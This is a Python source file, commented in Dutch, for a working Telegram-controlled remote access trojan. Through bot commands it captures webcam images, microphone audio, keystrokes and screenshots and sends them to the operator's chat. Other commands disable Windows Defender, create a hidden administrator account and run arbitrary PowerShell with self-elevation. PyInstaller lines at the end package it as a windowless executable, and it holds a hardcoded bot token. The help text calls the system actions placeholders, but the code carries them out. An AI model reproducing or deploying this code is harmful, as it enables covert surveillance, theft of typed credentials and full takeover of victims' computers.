# pip install python-telegram-bot
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
# Webcam
import cv2
# Microfoon
import sounddevice as sd
from scipy.io.wavfile import write
# Keylogger
from pynput import keyboard
# Screenshot
import mss
import mss.tools
import sys, ctypes, subprocess, os

# API token van telegram en botnaam
API_TOKEN = "7962006638:AAHyEPjerT5QiHURMoqBsszaErLRLcxoo5A"
BOT_HANDLE = '@Mumu1222322Bot'

# Start van bot
print("Bot is starting...")

# Command weergeeft de volgende opties in telegram m.b.v. /help
async def opties(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
 "Beschikbare commands:\n\n"
        "/start - Toon de banner\n"
        "/cam - Maak een foto (voorbeeldfunctie)\n"
        "/mic - Neem audio op (voorbeeldfunctie)\n"
        "/keys - Start een toetsregistratie-demo\n"
        "/ss - Maak een screenshot (voorbeeldfunctie)\n"
        "/help - Toon dit menu\n\n"
        "/stopdefender - (placeholder) Beschrijving van een systeemactie\n"
        "/newuser <naam> <wachtwoord> - (placeholder) Voorbeeld van gebruikersbeheer\n"
        "/cc <command> - (placeholder) Voer een custom opdracht uit\n"
        "\nLet op: bovenstaande systeemacties zijn placeholders en dienen alleen als voorbeeld.")

# Command to show banner
async def banner(update: Update, context: ContextTypes.DEFAULT_TYPE):    await update.message.reply_text("""
|   |_ | /< [-   `/ () |_| 
have a cupcake🧁""")
    
# Command to capture image
async def webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Initialize webcam (0 = default camera)
    cam = cv2.VideoCapture(0)

    # Capture one frame
    ret, frame = cam.read()

    if ret:
        cv2.imshow("Captured", frame)         
        camfoto = cv2.imwrite("captured_image.png", frame)       
        cv2.destroyWindow("Captured")       
    else:
        print("Failed to capture image.")

    cam.release() 
    await context.bot.send_photo(update.effective_chat.id, photo="./captured_image.png", caption="Pretty<3")

# Command to start micrecording
async def microfoon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    fs = 44100  # Sample rate
    seconds = 5  # Opname duur

    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write("recording.wav", fs, recording)

    await context.bot.send_audio(chat_id=update.effective_chat.id,
        audio=open("recording.wav", "rb"))

# Command to start keyboard
async def keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - stuurt een bericht dat key logging begonnen is
    - stuurt een string van de keys naar de chat
    - stuurt ook een screenshot van het scherm waar getyped werd
    """
    await context.bot.send_message(chat_id=update.effective_chat.id, text="key logging is begonnen...")
    string = get_loggedKeys()
    await update.message.reply_text(string)

def get_loggedKeys():
    """
    - start een keyboard listener
    - gebruikt log_a_string() om de keys in een list op te slaan
    - haalt alle aanhalings tekens uit de list
    - return een string van alle geklikte keys
    """
    # Collect events until released
    with keyboard.Listener(on_press=log_a_string) as listener:
        listener.join()
    
    send_string = ''.join(inputList).replace("'", "")

    # maak de lijst leeg voor de volgende keer
    inputList.clear()
    
    # return een list zonder aanhalings tekens
    return send_string

inputList = []
def log_a_string(key):
    """
    functie die binnen get_loggedKeys() aangeroepen wordt.
    - maakt een list van alle keys die geklikt zijn.
    - stopt als enter geklikt wordt.
    - delete alle 'key.shift' uit de list.
    """
    global inputList

    try:
        # de logger stoppen als enter geklikt wordt
        if key == key.enter:
            # delete Key.shift uit de list, als het voorkomt in de list
            while 'Key.shift' in inputList:
                inputList.remove('Key.shift')
            return False
        
        # spatie toevoegen als het gebruikt wordt
        elif key == key.space:
            inputList.append(" ")

        # als backspace geklikt wordt, en er staat iets in de list
        elif key == key.backspace and len(inputList) > 0:
            # haal dan de laatste item uit de list
            inputList.pop(-1)
        
        # voor letters en cijfers
        else:
            inputList.append(format(key.char))

    # als het tekens zijn
    except AttributeError:
        inputList.append(format(key))


# Command to screenshot
async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # 1 = primary monitor
        img = sct.grab(monitor)
        mss.tools.to_png(img.rgb, img.size, output="screenshot.png")

    with open("screenshot.png", "rb") as f:
        await context.bot.send_photo(chat_id=update.effective_chat.id,photo=f)

# als geen iets dat geen command geschreven wordt
async def no_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - De bot accepteerd alleen slash commands
    - bij alles dat geen slash command is geeft de bot deze reactie
    """
    await update.message.reply_text("Ik reageer alleen op slash commands. Gebruik /help voor een overzicht van alle commands.")

# -----------------------------------------
# powershell command via python

async def stopDefender_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - run een powershell command om windows defender uit te schakelen
    - run een command om te controleren als windows defender uit of aan staat
    - return de powershell output om te zien als de command wel of niet was uitgevoerd
    """
    admin_check = check_adminRights()
    if admin_check is not True:
        await update.message.reply_text(admin_check)
        get_adminRights()
        return
    
    run_powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true')
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Windows defender wordt uitgezet...")
    # meld dat Windows defender uit is
    commandOutput = run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
    await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')

async def newuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - maak een nieuwe windows user aan
      - eerste argument is de username
      - tweede argument is de password
    """
    if len(context.args) == 2 :
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Command wordt uitgevoerd...")
    else:
        await update.message.reply_text("Geef een username en password mee als je de command aanroept")
        return

    try:
        add_new_user = f'''
        $Password = ConvertTo-SecureString -AsPlainText "{context.args[1]}" -Force;
        New-LocalUser -Name "{context.args[0]}" -Password $Password;
        Add-LocalGroupMember -Group "Administrators" -Member "{context.args[0]}";
        '''
        run_powershell_command(add_new_user)
        
        commandOutput = run_powershell_command('Get-LocalGroupMember -Group "Administrators"')
        await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')

    except ValueError:
        await update.message.reply_text(f"Er is een fout opgetreden bij het uitvoeren: {ValueError}")

async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    - run een custom powershell command
    - custom commands moet je zelf typen via telegram chat
    - return de powershell output om te zien als de command wel of niet was uitgevoerd
    - als er '-admin' is in de string wordt er eerst een nieuwe terminal aangemaakt met powershell rechten
    - er wordt in de chat gemeld dat de command dan opnieuw uitgevoerd moet worden
    """
    # spaties na de command zorgen ervoor dat de command als losse list items opgeslagen worden in context.args
    # maak een een list met maar 2 argumenten, waarvan de eerste aangeeft als admin rechtenb nodig zijn
    args = command_list(context.args)

    if len(context.args) < 1:
        await update.message.reply_text("Geef tenimste 1 argument nadat je de command aanroept")
        return
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Command wordt uitgevoerd...")
    
    try:
        if len(args) == 1:
            commandOutput = run_powershell_command(args[0])
            await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')

        elif len(args) == 2 and args[0] == "-admin":
            # controleer als er admin rechten zijn. zo niet zet die aan.
            admin_check = check_adminRights()
            if admin_check is not True:
                await update.message.reply_text(admin_check)
                get_adminRights()
                return

            commandOutput = run_powershell_command(args[1])
            await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')

    except ValueError:
        await update.message.reply_text(f"Er is een fout opgetreden bij het uitvoeren: {ValueError}")

# run a powershell command
def run_powershell_command(cmd):
    """
    - cmd: is de command die binnen die powershel terminal uitgevoerd moet worden
    - return is de resultaat van de powershell command die uitgevoerd is
    """
    # https://www.phillipsj.net/posts/executing-powershell-from-python/
    # dit is de powershell command die uitgevoerd moet worden (deze command heeft adim rights nodig)
    runCommand = subprocess.run(
        ["powershell", "-Command", cmd], 
        capture_output=True, text=True
    )

    return runCommand.stdout


def get_adminRights():
    """
    - Maak een terminal open met admin rechten
    - en sluit de oude terminal (de terminal zonder admin rechten)
    """
    # Source: https://github.com/witchfindertr/Defeat-Defender-Python-Version-/blob/c2a43b4b2f570b87259ca368a98d2e3ab3572dff/Defeat-Defender.py#L11-L15
    if sys.argv[-1] != "asadmin":
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:] + ['asadmin'])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit(0)

def check_adminRights():
    """
    - Check of de bot admin rechten heeft
    - Zo niet,return melding als dat een admin powershel geopent wordt
    """
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True

    return "Geen admin rechten. Nieuwe admin terminal wordt gestart.\nProbeer de command opnieuw na de herstart."

def command_list(input_list):
    """
    - check als '-admin' als argument is meegegeven
      - plaats die in een list (list[0])
    - maak een string van de overige argumenten
      - sla die op in dezelfde list (list[1])
    """
    new_list = []

    # Check of -admin in de lijst zit
    if '-admin' in input_list:
        # voeg admin toe aan een nieuwe lijst
        new_list.append('-admin')
        # Maak een string van alles behalve -admin
        command = " ".join([item for item in input_list if item != '-admin'])
        new_list.append(command)
    else:
        # als er geen -admin is, alles samenvoegen
        command = " ".join(input_list)
        new_list.append(command)

    return new_list


# ------------------------------------------------------------------------------------
# Start the bot
if __name__ == '__main__':
    app = Application.builder().token(API_TOKEN).build()

    # Register command handlers
    app.add_handler(CommandHandler('help',opties))
    app.add_handler(CommandHandler('start', banner))
    app.add_handler(CommandHandler('cam', webcam))
    app.add_handler(CommandHandler('mic', microfoon))
    app.add_handler(CommandHandler('keys', keylogger))
    app.add_handler(CommandHandler('ss', screenshot))

    app.add_handler(CommandHandler('stopdefender', stopDefender_command))
    app.add_handler(CommandHandler('cc', custom_command))
    app.add_handler(CommandHandler('newuser', newuser_command))

    print('Starting polling...')
    # Run the bot
    app.run_polling(poll_interval=2)



# pyinstaller command
# py -m PyInstaller --onefile --clean --icon=./icon.ico -w --collect-all cv2 --collect-all telegram --collect-all telegram.ext --collect-all httpx --collect-all httpcore main.py

# py -m PyInstaller --onefile -w --icon=icon.ico --collect-all cv2 --collect-all telegram --collect-all mss --hidden-import=sounddevice --hidden-import=scipy --hidden-import=pynput main.py